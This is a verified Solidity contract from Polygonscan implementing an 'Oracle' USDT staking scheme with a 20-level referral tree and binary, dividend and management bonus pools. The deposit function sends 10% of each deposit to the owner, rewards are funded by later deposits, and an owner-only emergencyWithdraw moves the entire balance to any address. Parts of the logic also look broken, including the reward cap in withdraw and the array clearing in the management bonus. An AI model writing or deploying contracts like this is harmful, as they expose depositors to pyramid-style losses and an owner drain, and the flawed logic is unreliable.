/**
 *Submitted for verification at polygonscan.com on 2023-02-04
*/

// File: @openzeppelin/contracts/utils/Context.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

//SPDX-License-Identifier: <SPDX-License>
pragma solidity ^0.7.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

////SPDX-License-Identifier: <SPDX-License>
pragma solidity ^0.7.0;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow, so we distribute
        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see `ERC20Detailed`.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a `Transfer` event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through `transferFrom`. This is
     * zero by default.
     *
     * This value changes when `approve` or `transferFrom` are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * > Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an `Approval` event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a `Transfer` event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to `approve`. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Optional functions from the ERC20 standard.
 */
abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    /**
     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of
     * these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory name, string memory symbol, uint8 decimals) {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei.
     *
     * > Note that this information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * `IERC20.balanceOf` and `IERC20.transfer`.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}


/**
 * @dev Collection of functions related to the address type,
 */
// library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * This test is non-exhaustive, and there may be false-negatives: during the
     * execution of a contract's constructor, its address will be reported as
     * not containing a contract.
     *
     * > It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     */

// }

/**
 * @title SafeTRC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeTRC20 for ERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeTRC20 {
    using SafeMath for uint256;
    // using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        // solhint-disable-next-line max-line-length
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeTRC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves.

        // A Solidity high level call has three parts:
        //  1. The target address is checked to verify it contains contract code
        //  2. The call itself is made, and success asserted
        //  3. The return value is decoded, which in turn checks the size of the returned data.
        // solhint-disable-next-line max-line-length
        require(isContract(address(token)), "SafeTRC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeTRC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeTRC20: ERC20 operation did not succeed");
        }
    }
    
    function isContract(address account) internal view returns (bool) {
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}



 // SPDX-License-Identifier: <SPDX-License>
contract Oracle is Ownable {
    using SafeMath for uint256;
    using SafeTRC20 for IERC20;

    /* ========== STATE VARIABLES ========== */

    IERC20 public stakingToken;
    IERC20 public oracleToken;

    uint256 public _totalSupply;
    uint256 public _totalTokenSupply;
    mapping(address => uint256) public _depositedAmount;
    mapping(address => uint256) public _leftManageDepositedAmount;
    mapping(address => uint256) public _rightManageDepositedAmount;
    mapping(address => address) public _ref_address;
    mapping(address => uint256) public _withdrawTime;
    mapping(address => uint256) public _rewardAmount;
    mapping(address => mapping(uint256 => address[])) public levels;
    mapping(address => uint256) public levelsLength;
    mapping(address => mapping(uint256 => uint256)) public levelsPartnersLength;

    mapping(address => uint256) public _leftPartnersAmount;
    mapping(address => uint256) public _rightPartnersAmount;

    uint256 public minimumDepositAmount = 10000000;  // 10 USDT
    uint256 public minimumManageAmount = 1000000000;  //1000 USDT

    address public operator;

    uint16 constant BONUS_LINES_COUNT = 20;
    uint16[BONUS_LINES_COUNT] public ref_bonuses = [5, 5, 5, 5, 5, 5, 10, 10, 10, 10, 20, 20, 20, 20, 30, 30, 30, 40, 50, 70];

    uint16 constant PERCENT = 1000;
    uint256 lastBinaryRewardTime;
    uint256 lastRewardDividedTime;
    uint256 lastManagementBonusTime = block.timestamp;

    address[] allDistributors;
    address[] allManageDistributor;
    address[] allTokenHolders;

    uint256 public Pool1Amount;
    uint256 public Pool2Amount;
    uint256 public Pool3Amount;
    uint256 public Pool4Amount;

    mapping(address => uint16) public PositionLeftOrRight;
    
    

    modifier onlyOperator() {
        require(operator == msg.sender, "operator: caller is not the operator");
        _;
    }
    /* ========== CONSTRUCTOR ========== */

    constructor(
        address _stakingToken,
        address _oracleToken
    ) {
        stakingToken = IERC20(_stakingToken);
        oracleToken = IERC20(_oracleToken);
        operator = msg.sender;
        oracleToken.safeApprove(address(this), uint256(-1)); 
    }

    /* ========== VIEWS ========== */

    function totalSupply() external  view returns (uint256)  {
        return _totalSupply;
    }

    function depositedAmount(address account) external  view returns (uint256) {
        return _depositedAmount[account];
    }

    function deposit(address _upline, uint256 amount) external  {
        require(amount >= minimumDepositAmount, "Users must deposit in excess of the minimum deposit amount.");
        require(amount % minimumDepositAmount == 0, "Users must send 10 multiple USDT");

        _setUpline(msg.sender, _upline, amount);
        Pool1Amount += amount.mul(40).div(100);
        Pool2Amount += amount.mul(30).div(100);
        Pool3Amount += amount.mul(12).div(100);
        Pool4Amount += amount.mul(8).div(100);

        uint256 contractBalance = stakingToken.balanceOf(address(this));
        stakingToken.transferFrom(msg.sender, address(this), amount);
        oracleToken.transferFrom(address(this), msg.sender, amount.mul(10 ** 12));
        uint256 addedAmount = stakingToken.balanceOf(address(this)) - contractBalance;

        _totalSupply = _totalSupply.add(addedAmount);
        stakingToken.transfer(owner(), amount.div(10)); // 10 % tokens
        _depositedAmount[msg.sender] = _depositedAmount[msg.sender].add(addedAmount);

        allTokenHolders.push(msg.sender);
        _totalTokenSupply = _totalTokenSupply.add(amount.mul(10 ** 12));

    	emit NewDeposit(msg.sender, amount);
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(_ref_address[_addr] == address(0) && _addr != owner()) {
            _upline = owner();
        }

        uint16 manDisRegistered = 0;
        uint16 DisRegistered = 0;
        if(_amount > minimumManageAmount)
        {
            for (uint16 i = 0; i < allManageDistributor.length; i++)
            {
                if(allManageDistributor[i] == _upline) {
                    manDisRegistered = 1;
                }
            }
            if(manDisRegistered == 0) {
                allManageDistributor.push(_upline);
            }
        }
        for (uint16 i = 0; i < allDistributors.length; i ++)
        {
            if(allDistributors[i] == _upline)
            {
                DisRegistered = 1;
            }
        }
        if(DisRegistered == 0)
        {
            allDistributors.push(_upline);
        }

        uint256 currentLevel;
        uint256 currentPosition;
        for(uint16 i = 0; i < 20; i++)
        {
            if(levelsPartnersLength[_upline][i] < (i+1) *2 && _depositedAmount[_addr] == 0)
            {
                levels[_upline][i].push(_addr);
                currentLevel = i;
                levelsLength[_upline] = i + 1;
                levelsPartnersLength[_upline][i] += 1;
                currentPosition = levelsPartnersLength[_upline][i];
                if(currentPosition  < 2 ** i)
                {
                    PositionLeftOrRight[_addr] = 0;
                    _leftPartnersAmount[_upline] += _amount;
                    if(_amount > minimumManageAmount)
                    {
                        _leftManageDepositedAmount[_upline] +=  _amount;
                    }
                }else{
                    PositionLeftOrRight[_addr] = 1;
                    _rightPartnersAmount[_upline] += _amount;
                    if(_amount > minimumManageAmount)
                    {
                        _rightManageDepositedAmount[_upline] +=  _amount;
                    }
                }
                break;
            }else if(_depositedAmount[_addr] > 0)
            {
                if(PositionLeftOrRight[_addr] == 0)
                {
                    _leftPartnersAmount[_upline] += _amount;
                    if(_depositedAmount[_addr].add(_amount) > minimumManageAmount)
                    {
                        _leftManageDepositedAmount[_upline] +=  _amount;
                    }
                }else{
                    _rightPartnersAmount[_upline] += _amount;
                    if(_depositedAmount[_addr].add(_amount) > minimumManageAmount)
                    {
                        _rightManageDepositedAmount[_upline] +=  _amount;
                    }
                }
            }
        }
        if(currentLevel == 19 && currentPosition > 40)
        {
            currentPosition = 40;
        }

        if(currentLevel != 0)
        {
            for(uint256 j = 0; j < currentLevel; j++)
            {
                uint256 bonus = _amount * ref_bonuses[j] / PERCENT;
                _rewardAmount[levels[_upline][j][currentPosition / 2]] += bonus;
                currentPosition = currentPosition / 2;
            }
        }
    
        if(currentLevel < 20)
        {
            for(uint256 k = currentLevel; k < 20; k ++ )
            {
                uint256 bonus = _amount * ref_bonuses[k] / PERCENT;
                _rewardAmount[_upline] += bonus;
            }
        }
    }

    function withdraw() external  {
        uint256 rewardAmount = _rewardAmount[msg.sender];
        require(rewardAmount >= minimumDepositAmount, "You can only withdraw this rewardAmount bigger than 10 USDT");
        if(_withdrawTime[msg.sender].add(86400) > block.timestamp)
        {
            if( rewardAmount > _depositedAmount[msg.sender].mul(2))
            {
                Pool3Amount += rewardAmount.sub(_depositedAmount[msg.sender].mul(2));
                rewardAmount = _depositedAmount[msg.sender].mul(2);
            }
            _rewardAmount[msg.sender] = 0;
        }
        _totalSupply = _totalSupply.sub(rewardAmount);
        stakingToken.transfer(msg.sender, rewardAmount);
        _withdrawTime[msg.sender] = block.timestamp;
        emit Withdraw(msg.sender, rewardAmount);
    }

    function BinaryPlan() external {
        require(lastBinaryRewardTime.add(86400) < block.timestamp, "You can do this plan every day");
        uint256 totalPoint;
        require(allDistributors.length > 0);
        for(uint16 i = 0; i < allDistributors.length; i++)
        {
            address distributor;
            distributor = allDistributors[i];
            if(_leftPartnersAmount[distributor] > 0 && _rightPartnersAmount[distributor] > 0)
            {
                uint256 pointAmount;
                if(_leftPartnersAmount[distributor] > _rightPartnersAmount[distributor])
                {
                    pointAmount = _rightPartnersAmount[distributor].div(minimumDepositAmount);
                }else{
                    pointAmount = _leftPartnersAmount[distributor].div(minimumDepositAmount);
                }
                totalPoint += pointAmount;
            }
        }
        for(uint16 i = 0; i < allDistributors.length; i++)
        {
            address distributor;
            distributor = allDistributors[i];
            if(_leftPartnersAmount[distributor] > 0 && _rightPartnersAmount[distributor] > 0)
            {
                uint256 pointAmount;
                if(_leftPartnersAmount[distributor] > _rightPartnersAmount[distributor])
                {
                    pointAmount = _rightPartnersAmount[distributor].div(minimumDepositAmount);
                }else{
                    pointAmount = _leftPartnersAmount[distributor].div(minimumDepositAmount);
                }
                _rewardAmount[distributor] += Pool2Amount.mul(pointAmount).div(totalPoint);
            }
        }
        lastBinaryRewardTime = block.timestamp;
    }

    function dividendPlan() external {
        require(lastRewardDividedTime.add(604800) < block.timestamp, "You can divide Reward every week");
        for(uint16 i = 0; i < allTokenHolders.length; i++)
        {
            address holder;
            holder = allTokenHolders[i];
            uint256 dividendAmount = Pool3Amount.mul(_depositedAmount[holder]).div(_totalTokenSupply);
            stakingToken.transfer(holder, dividendAmount);
        }
        lastRewardDividedTime = block.timestamp;
    }

    function ManagementBonusPlan() external {
        require(lastManagementBonusTime.add(2592000) < block.timestamp, "You can do this plan every month");
        uint256 totalPoint;
        require(allManageDistributor.length > 0);
        for(uint16 i = 0; i < allManageDistributor.length; i++)
        {
            address distributor;
            distributor = allManageDistributor[i];
            if(_leftManageDepositedAmount[distributor] > 0 && _rightManageDepositedAmount[distributor] > 0)
            {
                uint256 pointAmount;
                if(_leftManageDepositedAmount[distributor] > _rightManageDepositedAmount[distributor])
                {
                    pointAmount = _rightManageDepositedAmount[distributor].div(minimumManageAmount);
                }else{
                    pointAmount = _leftManageDepositedAmount[distributor].div(minimumManageAmount);
                }
                totalPoint += pointAmount;
            }
        }
        for(uint16 i = 0; i < allManageDistributor.length; i++)
        {
            address distributor;
            distributor = allManageDistributor[i];
            if(_leftManageDepositedAmount[distributor] > 0 && _rightManageDepositedAmount[distributor] > 0)
            {
                uint256 pointAmount;
                if(_leftManageDepositedAmount[distributor] > _rightManageDepositedAmount[distributor])
                {
                    pointAmount = _rightManageDepositedAmount[distributor].div(minimumManageAmount);
                    _rightManageDepositedAmount[distributor] = 0;
                }else{
                    pointAmount = _leftManageDepositedAmount[distributor].div(minimumManageAmount);
                    _leftManageDepositedAmount[distributor] = 0;
                }
                uint256 amount = Pool4Amount.mul(pointAmount).div(totalPoint);
                stakingToken.transfer(distributor, amount);
            }
        }
        for(uint16 i = 0; i < allManageDistributor.length; i++)
        {
            allManageDistributor.pop();
        }
        lastManagementBonusTime = block.timestamp;
    }

   

    function setMinimumDepositAmount(uint256 _amount)  public onlyOwner returns (uint256) {
        minimumDepositAmount = _amount;
        return minimumDepositAmount;
    }



    function transferOperator(address _operator) public onlyOwner returns (address){
        operator = _operator;
        return operator;
    }

    function emergencyWithdraw(address receiver) external onlyOwner {
        uint256 tokenAmount = stakingToken.balanceOf(address(this));
        stakingToken.transferFrom(address(this), receiver, tokenAmount);
    }


    /* ========== EVENTS ========== */

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
}